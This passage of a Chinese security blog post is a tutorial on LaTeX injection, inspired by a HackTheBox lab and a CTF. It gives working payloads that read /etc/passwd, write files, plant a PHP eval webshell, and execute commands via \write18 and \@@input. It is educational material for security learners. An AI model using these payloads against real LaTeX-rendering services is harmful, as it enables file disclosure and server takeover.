@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言在打 HTB-Topology 的时候遇到了 LaTex 注入漏洞，不禁联想起之前打2022中科大 hackgame CTF 时 web 中的 LaTeX 机器人（当时做的时候可谓是一脸懵批），然后发现国内介绍该漏洞的文章好像挺少的，所以我也翻阅了一些文章资料简单研究一下，写了点总结，希望能对师傅们有所帮助，有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LaTex注入">
+<meta property="og:url" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="YDJ&#39;s_Bl0g">
+<meta property="og:description" content="声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。 0x00 前言在打 HTB-Topology 的时候遇到了 LaTex 注入漏洞，不禁联想起之前打2022中科大 hackgame CTF 时 web 中的 LaTeX 机器人（当时做的时候可谓是一脸懵批），然后发现国内介绍该漏洞的文章好像挺少的，所以我也翻阅了一些文章资料简单研究一下，写了点总结，希望能对师傅们有所帮助，有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209005-24.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-1.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-2.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-3.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-4.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-5.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-6.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-7.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-8.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-9.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-10.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-11.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-12.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-13.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-14.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-15.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-16.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-17.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-18.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-19.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-20.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-21.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-22.png">
+<meta property="og:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209003-23.png">
+<meta property="article:published_time" content="2023-11-05T21:02:46.000Z">
+<meta property="article:modified_time" content="2023-11-05T21:14:47.884Z">
+<meta property="article:author" content="YDJ">
+<meta property="article:tag" content="LaTex">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209005-24.png">
+
+<link rel="canonical" href="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>LaTex注入 | YDJ's_Bl0g</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">YDJ's_Bl0g</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="YDJ">
+      <meta itemprop="description" content="我这一生，如履薄冰">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YDJ's_Bl0g">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LaTex注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-06 05:02:46 / 修改时间：05:14:47" itemprop="dateCreated datePublished" datetime="2023-11-06T05:02:46+08:00">2023-11-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在打 HTB-Topology 的时候遇到了 LaTex 注入漏洞，不禁联想起之前打2022中科大 hackgame CTF 时 web 中的 LaTeX 机器人（当时做的时候可谓是一脸懵批），然后发现国内介绍该漏洞的文章好像挺少的，所以我也翻阅了一些文章资料简单研究一下，写了点总结，希望能对师傅们有所帮助，有不足之处还请多多指教</p>
+<span id="more"></span>
+
+<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><p>先来看一下 oi-wiki 中（<a target="_blank" rel="noopener" href="https://oi-wiki.org/tools/latex/%EF%BC%89%E5%85%B3%E4%BA%8E">https://oi-wiki.org/tools/latex/）关于</a> LaTex 的介绍：</p>
+<blockquote>
+<p>LaTeX（读作&#x2F;ˈlɑːtɛx&#x2F;或&#x2F;ˈleɪtɛx&#x2F;）是一个让你的文档看起来更专业的排版系统，而不是文字处理器。它尤其适合处理篇幅较长、结构严谨的文档，并且十分擅长处理公式表达。它是免费的软件，对大多数操作系统都适用。</p>
+<p>LaTeX 基于 TeX（Donald Knuth 在 1978 年为数字化排版设计的排版系统）。TeX 是一种电脑能够处理的低级语言，但大多数人发现它很难使用。LaTeX 正是为了让它变得更加易用而设计的。目前 LaTeX 的版本是 LaTeX 2e。</p>
+<p>如果你习惯于使用微软的 Office Word 处理文档，那么你会觉得 LaTeX 的工作方式让你很不习惯。Word 是典型的「所见即所得」的编辑器，你可以在编排文档的时侯查看到最终的排版效果。但使用 LaTeX 时你并不能方便地查看最终效果，这使得你专注于内容而不是外观的调整。</p>
+<p>一个 LaTeX 文档是一个以 .tex 结尾的文本文件，可以使用任意的文本编辑器编辑，比如 Notepad，但对于大多数人而言，使用一个合适的 LaTeX 编辑器会使得编辑的过程容易很多。在编辑的过程中你可以标记文档的结构。完成后你可以进行编译——这意味着将它转化为另一种格式的文档。它支持多种格式，但最常用的是 PDF 文档格式。</p>
+</blockquote>
+<p>站在一个安全人员的角度我们不难发现 LaTex 存在的问题：高度的自定义和控制，而且还可以像其他编程语言一样在编译后实现读写文件，执行命令等操作，导致了安全隐患</p>
+<p>官方也有考虑到了这一点，通过 texmf.cnf 配置文件控制 latex 的行为</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% Enable system commands via \write18&#123;...&#125;.  When enabled fully (set to</span></span><br><span class="line"><span class="comment">% t), obviously insecure.  When enabled partially (set to p), only the</span></span><br><span class="line"><span class="comment">% commands listed in shell_escape_commands are allowed.  Although this</span></span><br><span class="line"><span class="comment">% is not fully secure either, it is much better, and so useful that we</span></span><br><span class="line"><span class="comment">% enable it for everything but bare tex.</span></span><br><span class="line">shell<span class="built_in">_</span>escape = p</span><br><span class="line"></span><br><span class="line"><span class="comment">% No spaces in this command list.</span></span><br><span class="line"><span class="comment">%</span></span><br><span class="line"><span class="comment">% The programs listed here are as safe as any we know: they either do</span></span><br><span class="line"><span class="comment">% not write any output files, respect openout_any, or have hard-coded</span></span><br><span class="line"><span class="comment">% restrictions similar or higher to openout_any=p.  They also have no</span></span><br><span class="line"><span class="comment">% features to invoke arbitrary other programs, and no known exploitable</span></span><br><span class="line"><span class="comment">% bugs.  All to the best of our knowledge.  They also have practical use</span></span><br><span class="line"><span class="comment">% for being called from TeX.</span></span><br><span class="line"><span class="comment">%</span></span><br><span class="line">shell<span class="built_in">_</span>escape<span class="built_in">_</span>commands = <span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>bibtex,bibtex8,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>extractbb,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>kpsewhich,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>makeindex,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>mpost,<span class="keyword">\</span></span><br><span class="line"><span class="keyword"></span>repstopdf,<span class="keyword">\</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>shell_escape</li>
+</ul>
+<blockquote>
+<p>f：不允许执行任何命令 t：允许执行任何命令 p：支持执行白名单内的命令(默认)</p>
+</blockquote>
+<p>命令行查看（需下载环境）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kpsewhich --var-value shell_escape</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209005-24.png" alt="img"></p>
+<ul>
+<li>shell_escape_commands</li>
+</ul>
+<blockquote>
+<p>白名单</p>
+</blockquote>
+<p>命令行查看（需下载环境）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kpsewhich --var-value shell_escape_commands</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-1.png" alt="img"></p>
+<p>尽管默认配置启用了白名单模式，但是还是存在被绕过的风险</p>
+<h1 id="0x02-LaTex环境"><a href="#0x02-LaTex环境" class="headerlink" title="0x02 LaTex环境"></a>0x02 LaTex环境</h1><ol>
+<li><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3></li>
+</ol>
+<p>由于我并不经常使用 LaTex，所以我使用的是在线的编辑器，离线的大家可以自行安装，网上有比较详细的</p>
+<h5 id="https-www-papeeria-com"><a href="#https-www-papeeria-com" class="headerlink" title="https://www.papeeria.com"></a><a target="_blank" rel="noopener" href="https://www.papeeria.com/">https://www.papeeria.com</a></h5><p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-2.png" alt="img"></p>
+<ul>
+<li>点击 Live demo</li>
+</ul>
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-3.png" alt="img"></p>
+<ul>
+<li>点击 Sign Up 登录，我是谷歌账号一键登录了</li>
+</ul>
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-4.png" alt="img"></p>
+<ul>
+<li>写好代码然后点击编译就可以了（好像显示不了中文……）</li>
+</ul>
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209001-5.png" alt="img"></p>
+<p>（可以先去过一下基础的语法，这里不过多叙述）</p>
+<ol>
+<li><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3></li>
+</ol>
+<h5 id="texlive"><a href="#texlive" class="headerlink" title="texlive"></a>texlive</h5><ul>
+<li>apt 一键安装环境</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install texlive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-6.png" alt="img"></p>
+<ul>
+<li>写好代码</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% demo.tex</span></span><br><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;  </span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125;  </span><br><span class="line"></span><br><span class="line">LaTex injection demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>pdflatex编译</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdflatex demo.tex</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-7.png" alt="img"></p>
+<p>查看 demo.tex</p>
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-8.png" alt="img"></p>
+<h1 id="0x03-攻击方式"><a href="#0x03-攻击方式" class="headerlink" title="0x03 攻击方式"></a>0x03 攻击方式</h1><ol>
+<li><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3></li>
+</ol>
+<p>有一篇文章：<a target="_blank" rel="noopener" href="https://twitter.com/intigriti/status/1101509684614320130">https://twitter.com/intigriti/status/1101509684614320130</a></p>
+<ul>
+<li>href，需要导入 hyperref 包，注意导入语句的位置，否则会报错</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;hyperref&#125;</span><br><span class="line"><span class="keyword">\href</span>&#123;<span class="link">javascript:alert(1)</span>&#125;&#123;xss&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-9.png" alt="img"></p>
+<p>应该是解析问题，href 生效了但是 alert 不出来……</p>
+<ul>
+<li>url，需要导入 url 包</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;url&#125;</span><br><span class="line"><span class="keyword">\url</span>&#123;<span class="link">javascript:alert(1)</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-10.png" alt="img"></p>
+<p>这个直接变成文字显示了……</p>
+<p>(失败的复现)</p>
+<ol>
+<li><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3></li>
+</ol>
+<ul>
+<li>input全文读取</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\input</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-11.png" alt="img"></p>
+<ul>
+<li>读取一行</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newread</span><span class="keyword">\file</span></span><br><span class="line"><span class="keyword">\openin</span><span class="keyword">\file</span>=/etc/passwd</span><br><span class="line"><span class="keyword">\read</span><span class="keyword">\file</span> to<span class="keyword">\line</span></span><br><span class="line"><span class="keyword">\text</span>&#123;<span class="keyword">\line</span>&#125;</span><br><span class="line"><span class="keyword">\closein</span><span class="keyword">\file</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-12.png" alt="img"></p>
+<ul>
+<li>循环读取多行</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newread</span><span class="keyword">\file</span></span><br><span class="line"><span class="keyword">\openin</span><span class="keyword">\file</span>=/etc/passwd</span><br><span class="line"><span class="keyword">\loop</span><span class="keyword">\unless</span><span class="keyword">\ifeof</span><span class="keyword">\file</span>    <span class="comment">% 循环开始的标记，会重复执行下面的代码，直到读取到文件末尾（EOF）为止</span></span><br><span class="line">    <span class="keyword">\read</span><span class="keyword">\file</span> to<span class="keyword">\fileline</span></span><br><span class="line">    <span class="keyword">\text</span>&#123;<span class="keyword">\fileline</span>&#125;</span><br><span class="line"><span class="keyword">\repeat</span>                    <span class="comment">% 循环的结束标记，表示要回到循环的开始处继续执行，除非已经达到文件末尾</span></span><br><span class="line"><span class="keyword">\closein</span><span class="keyword">\file</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-13.png" alt="img"></p>
+<ul>
+<li>导入 verbatim 包读取</li>
+</ul>
+<p> verbatim 宏包用于在文档中显示原始的、未经处理的文本，包括特殊字符和空格</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;verbatim&#125;    </span><br><span class="line"><span class="keyword">\verbatiminput</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-14.png" alt="img"></p>
+<ul>
+<li>导入 listings 包读取</li>
+</ul>
+<p>listings 宏包用于在文档中插入格式化的源代码，也可以读取并显示文件中的源代码</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;listings&#125;</span><br><span class="line"><span class="keyword">\lstinputlisting</span>&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-15.png" alt="img"></p>
+<ul>
+<li>写入并读取</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newwrite</span><span class="keyword">\outfile</span></span><br><span class="line"><span class="keyword">\openout</span><span class="keyword">\outfile</span>=demo    </span><br><span class="line"><span class="keyword">\write</span><span class="keyword">\outfile</span>&#123;write-file&#125;</span><br><span class="line"><span class="keyword">\closeout</span><span class="keyword">\outfile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\input</span>&#123;demo&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-16.png" alt="img"></p>
+<ul>
+<li>写入并包含</li>
+</ul>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newwrite</span><span class="keyword">\outfile</span></span><br><span class="line"><span class="keyword">\openout</span><span class="keyword">\outfile</span>=demo    <span class="comment">% 默认后缀.tex</span></span><br><span class="line"><span class="keyword">\write</span><span class="keyword">\outfile</span>&#123;write-file&#125;</span><br><span class="line"><span class="keyword">\closeout</span><span class="keyword">\outfile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\include</span>&#123;demo&#125;    <span class="comment">% 可以包含tex后缀的文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-17.png" alt="img"></p>
+<ul>
+<li>写 webshell</li>
+</ul>
+<p>如果目标环境为 php，我们可以尝试 webshell 的写入</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;filecontents*&#125;&#123;shell.php&#125;<span class="string"></span></span><br><span class="line"><span class="string">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string"></span><span class="keyword">\end</span>&#123;filecontents*&#125;</span><br></pre></td></tr></table></figure>
+
+<p>\begin{filecontents*} 用于在 LaTeX 源文件中创建和写入外部文件。它通常用于生成包含数据或代码的临时文件，以便在文档中进行引用或展示。而且 \begin{filecontents*} 环境只能在导言区（preamble）中使用，并且应将其放置在 \documentclass 命令之前，否则会产生报错</p>
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-18.png" alt="img"></p>
+<ol>
+<li><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3></li>
+</ol>
+<ul>
+<li>\write18</li>
+</ul>
+<p>LaTex 中执行命令的语法，但是由于 LaTeX 的延迟处理机制等问题，需要配合 \immediate（立即执行）来使用</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\immediate</span><span class="keyword">\write</span>18&#123;whoami&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是无回显，还要配合文件读取输出执行结果</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\immediate</span><span class="keyword">\write</span>18&#123;whoami &gt; output&#125;</span><br><span class="line"><span class="keyword">\input</span>&#123;output&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/06/LaTex%E6%B3%A8%E5%85%A5/1699218209002-19.png" alt="img"></p>
+<ul>
+<li>\makeatletter &amp; \makeatother</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\makeatletter</span><br><span class="line">\@@input|<span class="string">&quot;whoami&quot;</span></span><br><span class="line">\makeatother</span><br></pre></td></tr></table></figure>
+
